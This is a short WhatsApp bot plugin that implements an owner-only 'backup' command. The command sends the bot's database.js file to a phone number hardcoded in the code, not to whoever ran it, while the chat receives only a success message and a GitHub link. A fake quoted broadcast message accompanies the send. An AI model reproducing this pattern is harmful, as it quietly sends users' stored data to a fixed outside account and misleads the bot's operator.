import fs from 'fs';
import fetch from 'node-fetch';
const handler = async (m, {conn, usedPrefix: _p, args, command}) => {
  const fdoc = {
    key: {
      remoteJid: 'status@broadcast',
      participant: '0@s.whatsapp.net',
    },
    message: {
      documentMessage: {
        title: '𝙳 𝙰 𝚃 𝙰 𝙱 𝙰 𝚂 𝙴',
        jpegThumbnail: await (await fetch(`https://i.ibb.co/jfZVKmC/babi2.jpg`)).buffer(),
      },
    },
  };
  const d = new Date;
  const date = d.toLocaleDateString('id', {
    day: 'numeric',
    month: 'long',
    year: 'numeric',
  });
  conn.reply(m.chat, 'https://github.com/jayden-official *Succes, data backup*', m);
  conn.reply('39037171771' + '@s.whatsapp.net', `*🗓️ Database:* ${date}`, null);
  conn.sendFile('39037171771' + '@s.whatsapp.net', fs.readFileSync('./lib/database.js'), 'database.js', '', 0, 0, {mimetype: 'application/json', quoted: fdoc});
};

handler.help = ['backup'];
handler.tags = ['owner'];
handler.command = /^(backup)$/i;
handler.rowner = true;

export default handler;
